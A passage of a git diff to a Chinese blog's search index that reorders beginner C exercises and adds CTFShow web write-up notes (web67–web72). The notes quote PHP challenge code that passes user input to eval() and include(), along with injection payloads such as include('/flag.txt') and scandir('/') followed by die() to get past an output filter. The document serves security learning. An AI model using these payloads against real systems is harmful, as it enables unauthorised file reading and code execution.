@@ -21,6 +21,26 @@
       </tags>
   </entry>
   <entry>
+    <title>1 3 3 9 2 7 1 4 4 1 6 6 3 6 1 8 8 6 4 2</title>
+    <url>/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/</url>
+    <content><![CDATA[<h1 id="1-3-3-9-2-7-1-4-4-1-6"><a href="#1-3-3-9-2-7-1-4-4-1-6" class="headerlink" title="1 3 3 9 2 7 1 4 4 1 6"></a>1 3 3 9 2 7 1 4 4 1 6</h1><p>输出数列： 1 3 3 9 2 7 1 4 4 1 6…… 前20项。  </p>
+<p>源代码： </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t=<span class="number">0</span>;</span><br><span class="line">	a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]*a[i<span class="number">-2</span>];</span><br><span class="line">			t=a[i];</span><br><span class="line">			<span class="keyword">if</span>(t&gt;=<span class="number">10</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j=t;</span><br><span class="line">					a[i]=t/=<span class="number">10</span>;</span><br><span class="line">					a[++i]=j%=<span class="number">10</span>; </span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<p><img src="//czheisenberg.github.io/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/133927.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>C语言数列</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>123---321</title>
     <url>/2019/08/22/123-321/</url>
     <content><![CDATA[<h1 id="倒着输出"><a href="#倒着输出" class="headerlink" title="倒着输出"></a>倒着输出</h1><p>输入一个整数：123 输出：321  </p>
@@ -40,16 +60,36 @@
       </tags>
   </entry>
   <entry>
-    <title>1 3 3 9 2 7 1 4 4 1 6 6 3 6 1 8 8 6 4 2</title>
-    <url>/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/</url>
-    <content><![CDATA[<h1 id="1-3-3-9-2-7-1-4-4-1-6"><a href="#1-3-3-9-2-7-1-4-4-1-6" class="headerlink" title="1 3 3 9 2 7 1 4 4 1 6"></a>1 3 3 9 2 7 1 4 4 1 6</h1><p>输出数列： 1 3 3 9 2 7 1 4 4 1 6…… 前20项。  </p>
-<p>源代码： </p>
+    <title>1²+2²+3²+……10²</title>
+    <url>/2019/08/05/1%C2%B2-2%C2%B2-3%C2%B2-%E2%80%A6%E2%80%A610%C2%B2/</url>
+    <content><![CDATA[<h1 id="1²-2²-3²-……10²"><a href="#1²-2²-3²-……10²" class="headerlink" title="1²+2²+3²+……10²"></a>1²+2²+3²+……10²</h1><p>计算1²+2²+3²+……10²：  </p>
+<p>源代码：</p>
 <a id="more"></a>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 20</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[N],i,j,t=<span class="number">0</span>;</span><br><span class="line">	a[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">	a[<span class="number">1</span>]=<span class="number">3</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			a[i]=a[i<span class="number">-1</span>]*a[i<span class="number">-2</span>];</span><br><span class="line">			t=a[i];</span><br><span class="line">			<span class="keyword">if</span>(t&gt;=<span class="number">10</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					j=t;</span><br><span class="line">					a[i]=t/=<span class="number">10</span>;</span><br><span class="line">					a[++i]=j%=<span class="number">10</span>; </span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d "</span>,a[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,sum=<span class="number">0</span>,temp;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=i*i;</span><br><span class="line">			sum+=temp;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"sum=%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/08/05/1²-2²-3²-……10²/011.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+        <tag>C语言数列</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2+22+222+2222+22222+222222+2222222</title>
+    <url>/2019/08/17/2-22-222-2222-22222-222222-2222222/</url>
+    <content><![CDATA[<h1 id="求2-22-222……前7项和"><a href="#求2-22-222……前7项和" class="headerlink" title="求2+22+222……前7项和"></a>求2+22+222……前7项和</h1><p>计算 2+22+222+2222+22222+222222+2222222 </p>
+<p>源代码：</p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 7</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,i,temp=<span class="number">10</span>,sum=<span class="number">0</span>;</span><br><span class="line">	a=b=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d+"</span>,a)	;</span><br><span class="line">			sum+=a;</span><br><span class="line">			a=b*temp+a;</span><br><span class="line">			temp*=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\b=%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：</p>
-<p><img src="//czheisenberg.github.io/2019/08/17/1-3-3-9-2-7-1-4-4-1-6-6-3-6-1-8-8-6-4-2/133927.jpg" alt></p>
+<p><img src="//czheisenberg.github.io/2019/08/17/2-22-222-2222-22222-222222-2222222/2+22+222.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -77,45 +117,6 @@
       </categories>
       <tags>
         <tag>C</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2+22+222+2222+22222+222222+2222222</title>
-    <url>/2019/08/17/2-22-222-2222-22222-222222-2222222/</url>
-    <content><![CDATA[<h1 id="求2-22-222……前7项和"><a href="#求2-22-222……前7项和" class="headerlink" title="求2+22+222……前7项和"></a>求2+22+222……前7项和</h1><p>计算 2+22+222+2222+22222+222222+2222222 </p>
-<p>源代码：</p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 7</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a,b,i,temp=<span class="number">10</span>,sum=<span class="number">0</span>;</span><br><span class="line">	a=b=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"%d+"</span>,a)	;</span><br><span class="line">			sum+=a;</span><br><span class="line">			a=b*temp+a;</span><br><span class="line">			temp*=<span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\b=%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：</p>
-<p><img src="//czheisenberg.github.io/2019/08/17/2-22-222-2222-22222-222222-2222222/2+22+222.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-        <tag>C语言数列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>99乘法表</title>
-    <url>/2019/08/18/99%E4%B9%98%E6%B3%95%E8%A1%A8/</url>
-    <content><![CDATA[<h1 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h1><p>源代码：  </p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%2d*%2d=%2d"</span>,i,j,i*j);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/08/18/99乘法表/99.jpg" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
-        <tag>C语言数列</tag>
       </tags>
   </entry>
   <entry>
@@ -158,16 +159,15 @@
       </tags>
   </entry>
   <entry>
-    <title>1²+2²+3²+……10²</title>
-    <url>/2019/08/05/1%C2%B2-2%C2%B2-3%C2%B2-%E2%80%A6%E2%80%A610%C2%B2/</url>
-    <content><![CDATA[<h1 id="1²-2²-3²-……10²"><a href="#1²-2²-3²-……10²" class="headerlink" title="1²+2²+3²+……10²"></a>1²+2²+3²+……10²</h1><p>计算1²+2²+3²+……10²：  </p>
-<p>源代码：</p>
+    <title>99乘法表</title>
+    <url>/2019/08/18/99%E4%B9%98%E6%B3%95%E8%A1%A8/</url>
+    <content><![CDATA[<h1 id="九九乘法表"><a href="#九九乘法表" class="headerlink" title="九九乘法表"></a>九九乘法表</h1><p>源代码：  </p>
 <a id="more"></a>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,sum=<span class="number">0</span>,temp;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">10</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			temp=i*i;</span><br><span class="line">			sum+=temp;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"sum=%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">9</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"%2d*%2d=%2d"</span>,i,j,i*j);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>运行结果：  </p>
-<p><img src="//czheisenberg.github.io/2019/08/05/1²-2²-3²-……10²/011.jpg" alt></p>
+<p><img src="//czheisenberg.github.io/2019/08/18/99乘法表/99.jpg" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -175,24 +175,6 @@
       <tags>
         <tag>C</tag>
         <tag>C语言数列</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Welcome</title>
-    <url>/2019/07/15/Welcome/</url>
-    <content><![CDATA[<h1 id="我的第一个博客"><a href="#我的第一个博客" class="headerlink" title="我的第一个博客"></a>我的第一个博客</h1><p>创建第一个C语言程序“Hello World”<br>源代码：</p>
-<a id="more"></a>
-
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>运行结果：<br>Hello World</p>
-<p><img src="//czheisenberg.github.io/2019/07/15/Welcome/1.png" alt></p>
-]]></content>
-      <categories>
-        <category>C语言</category>
-      </categories>
-      <tags>
-        <tag>C</tag>
       </tags>
   </entry>
   <entry>
@@ -506,6 +488,35 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=highlight_file(<span class="string">'/flag.txt'</span>);</span><br></pre></td></tr></table></figure>
 
 <p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web66_2.png" alt></p>
+<h2 id="web67——命令执行"><a href="#web67——命令执行" class="headerlink" title="web67——命令执行"></a>web67——命令执行</h2><p><strong>同 web66</strong></p>
+<h2 id="web68——命令执行"><a href="#web68——命令执行" class="headerlink" title="web68——命令执行"></a>web68——命令执行</h2><p>源码:: 没有显示源码可能环境坏了，只有一个报错:显示 highlight_file() 不能使用</p>
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web68.png" alt></p>
+<p>看了官方提示:用 include</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">'index.php'</span>);</span><br><span class="line"><span class="comment">// 会显示 超过了内存大小，证明 index.php 文件太大了</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web68_1.png" alt></p>
+<p>根据上面几道题的 flag 的位置，尝试 直接：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">post:</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">'/flag.txt'</span>);</span><br><span class="line">c=<span class="keyword">require</span>(<span class="string">'/flag.txt'</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web68_2.png" alt></p>
+<h2 id="web69——命令执行"><a href="#web69——命令执行" class="headerlink" title="web69——命令执行"></a>web69——命令执行</h2><p><strong>同 web68</strong></p>
+<h2 id="web70——命令执行"><a href="#web70——命令执行" class="headerlink" title="web70——命令执行"></a>web70——命令执行</h2><p><strong>同 web68</strong></p>
+<h2 id="web71——命令执行"><a href="#web71——命令执行" class="headerlink" title="web71——命令执行"></a>web71——命令执行</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">'c'</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">"/[0-9]|[a-z]/i"</span>,<span class="string">"?"</span>,$s);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ob_get_contentx() 	返回输出缓冲区的内容</span></span><br><span class="line"><span class="comment">// ob_start() 			打开输出控制缓冲</span></span><br><span class="line"><span class="comment">// ob_end_clean() 		清空（擦除）缓冲区并关闭输出缓冲</span></span><br><span class="line"><span class="comment">// 把 数字字母 都替换为了 '?'</span></span><br></pre></td></tr></table></figure>
+
+<p>此题首先 执行 : eval($c),将获取到了$c执行一遍，然后 $s = bo_get_contents();将$c执行的内容由缓存读取到了变量 $s,接下来的 preg_replace()会将缓存中的所有内容替换为‘?’:因此我们将会看到如下：</p>
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web71.png" alt></p>
+<p>如图所示：扫描目录出来的结果都变了 <strong>??????? and 你要上天吗？</strong>,因此不得让 ? 执行，那么可在 eval($c)执行完毕后将整个php程序给结束不再执行后面的语句就绕过字母数字的替换:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">'/'</span>));<span class="keyword">die</span>();</span><br><span class="line">c=var_export(scandir(<span class="string">'/'</span>));<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web71_1.png" alt></p>
+<p>如图找到了 flag.txt 和上面几道题的位置一样:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">'/flag.txt'</span>);<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">'/flag.txt'</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p><img src="//czheisenberg.github.io/2021/07/22/CTFShow-Web笔记/web71_2.png" alt></p>
+<h2 id="web72——命令执行"><a href="#web72——命令执行" class="headerlink" title="web72——命令执行"></a>web72——命令执行</h2><p>源码同上一题: 此题不会</p>
 <h2 id="web78——文件包含——php伪协议"><a href="#web78——文件包含——php伪协议" class="headerlink" title="web78——文件包含——php伪协议"></a>web78——文件包含——php伪协议</h2><p>源码:</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -606,6 +617,27 @@
       </tags>
   </entry>
   <entry>
+    <title>lonely_number</title>
+    <url>/2019/08/18/lonelynumber/</url>
+    <content><![CDATA[<h1 id="质数"><a href="#质数" class="headerlink" title="质数"></a>质数</h1><p>除了1和它本身以外不再有其他因数的自然数。  </p>
+<p>我认为除了1和它本身之外 太孤独了!</p>
+<p>so  lonely_number()  </p>
+<p>源代码：  </p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lonely_number</span><span class="params">(<span class="keyword">int</span> number)</span><span class="comment">//除了1和它本身以外不再有其他因数的自然数。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span>(i&gt;number/<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1000以内的质数（素数）：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(lonely_number(i))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"%3d "</span>,i);</span><br><span class="line">					j++;</span><br><span class="line">					<span class="keyword">if</span>(j%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：  </p>
+<p><img src="//czheisenberg.github.io/2019/08/18/lonelynumber/lonely-number.jpg" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>fibonacci sequence</title>
     <url>/2019/07/16/fibonacci-sequence/</url>
     <content><![CDATA[<h1 id="斐波拉契数列"><a href="#斐波拉契数列" class="headerlink" title="斐波拉契数列"></a>斐波拉契数列</h1><h2 id="fibonacci-sequence"><a href="#fibonacci-sequence" class="headerlink" title="fibonacci sequence"></a>fibonacci sequence</h2><p>利用数组求出斐波拉契数列前20项:  </p>
@@ -616,6 +648,24 @@
 
 <p>运行结果：  </p>
 <p><img src="//czheisenberg.github.io/2019/07/16/fibonacci-sequence/2.png" alt></p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>C</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Welcome</title>
+    <url>/2019/07/15/Welcome/</url>
+    <content><![CDATA[<h1 id="我的第一个博客"><a href="#我的第一个博客" class="headerlink" title="我的第一个博客"></a>我的第一个博客</h1><p>创建第一个C语言程序“Hello World”<br>源代码：</p>
+<a id="more"></a>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：<br>Hello World</p>
+<p><img src="//czheisenberg.github.io/2019/07/15/Welcome/1.png" alt></p>
 ]]></content>
       <categories>
         <category>C语言</category>
@@ -661,18 +711,17 @@
       </tags>
   </entry>
   <entry>
-    <title>lonely_number</title>
-    <url>/2019/08/18/lonelynumber/</url>
-    <content><![CDATA[<h1 id="质数"><a href="#质数" class="headerlink" title="质数"></a>质数</h1><p>除了1和它本身以外不再有其他因数的自然数。  </p>
-<p>我认为除了1和它本身之外 太孤独了!</p>
-<p>so  lonely_number()  </p>
+    <title>十进制转二进制</title>
+    <url>/2019/07/16/%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E4%BA%8C%E8%BF%9B%E5%88%B6/</url>
+    <content><![CDATA[<h1 id="十进制转二进制"><a href="#十进制转二进制" class="headerlink" title="十进制转二进制"></a>十进制转二进制</h1><p>编写一个C程序实现进制转换：  </p>
+<p>10 to 2:</p>
 <p>源代码：  </p>
 <a id="more"></a>
 
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">"stdio.h"</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lonely_number</span><span class="params">(<span class="keyword">int</span> number)</span><span class="comment">//除了1和它本身以外不再有其他因数的自然数。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">2</span>;i&lt;=number/<span class="number">2</span>;i++)</span><br><span class="line">		<span class="keyword">if</span>(number%i==<span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span>(i&gt;number/<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"1000以内的质数（素数）：\n"</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=<span class="number">1000</span>;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(lonely_number(i))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"%3d "</span>,i);</span><br><span class="line">					j++;</span><br><span class="line">					<span class="keyword">if</span>(j%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stoe</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,e=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(number)</span><br><span class="line">	&#123;</span><br><span class="line">		sum+=number%<span class="number">2</span>*e;</span><br><span class="line">		number/=<span class="number">2</span>;</span><br><span class="line">		e*=<span class="number">10</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span 